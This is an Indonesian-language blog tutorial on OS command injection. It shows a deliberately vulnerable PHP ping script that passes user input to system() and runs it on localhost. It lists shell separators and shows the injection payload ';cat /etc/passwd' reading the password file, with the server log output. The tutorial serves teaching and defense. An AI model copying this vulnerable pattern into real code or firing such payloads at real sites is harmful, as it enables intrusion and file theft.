---
title: os command injection 
date: 2022-09-01
tags: ["exploitation"]
---
{{< raw >}}
<img src="/images/cuteheker.jpeg">
{{< /raw >}}

<br>
<br>

os command injection biasanya terjadi ketika seorang web developer keliru
dalam mengatur penerimaan input didalam situsnya. biasanya terjadi ketika
form input yang dibuat menggunakan fungsi seperti `exec()`, `system()`, dll.
tergantung fungsi tersebut berasal dari bahasa pemogramman apa. jika python
biasanya menggunakan `os.system()` atau `eval()`, etc.

tentu saja ini jadi sesuatu yang sangat berbahaya dikarenakan attacker dapat
memasukan perintah berbahaya kedalam shell sistem operasi yang ada disitus tersebut.

>Serangan command injection bisa terjadi ketika sebuah aplikasi 
>(forms, cookies, HTTP headers, dll) bisa menjalankan perintah yang 
>tidak aman dari inputan user ke sistem shell. 
{{< raw >}}
<a href="https://crashtest-security.com/command-injection/">crashtest security</a>
{{< /raw >}}

menurut crashtest security, os command injection tidak hanya bisa terjadi
di forms melainkan bisa saja ditempat lain seperti diatas.

# demonstrasi

contoh kode php yang rentan dengan os command injection karena ketiadaan
validasi input ataupun proses filtering.

```shell 
<?php
$ip = $_GET['ip'];
$cmd = system('ping '.$ip); 

echo $cmd
?>
```

- buat file `ping.php` & jalankan diterminal kalian

`$ php -S 127.0.0.1:8000 -t .`


kunjungi dan cobalah masukan input seperti ini

**http://127.0.0.1:8000/ping.php?ip=cat%20/etc/passwd**

maka jika dibrowser saya, ini tidak menghasilkan apa-apa. dikarenakan perintah
**cat /etc/passwd** masih dianggap sebagai argumen untuk ping.

```shell
[Thu Sep  1 18:16:34 2022] 127.0.0.1:41126 Accepted
ping: unknown host cat
[Thu Sep  1 18:16:34 2022] 127.0.0.1:41125 [200]: GET /ping.php?ip=cat%20/etc/passwd
[Thu Sep  1 18:16:34 2022] 127.0.0.1:41125 Closing
```

bisa dilihat disana ada pesan **uknown host cat**. yang menandakan perintah cat 
kita dianggap destination dari ping. nah kalian bisa mencoba nya lagi
dengan membatalkan perintah ping dengan shell escapes.

```
;
|
||
<
&
&&
$()
```


let's try again


**http://127.0.0.1:8000/ping.php?ip=;cat /etc/passwd**



maka kalian bisa melihat bahwa disini kita berhasil untuk melakukan perintah cat
terhadap file passwd.

{{< raw >}}
<img src="/images/oci.jpg">
{{< /raw >}}

btw saya ngejalanin file php nya di termux, jadi output dari **/etc/passwd** nya
agak aneh hhe.




# other references
beberapa referensi lain yang membahas command injection lebih detail.

- command injection 
https://book.hacktricks.xyz/pentesting-web/command-injection
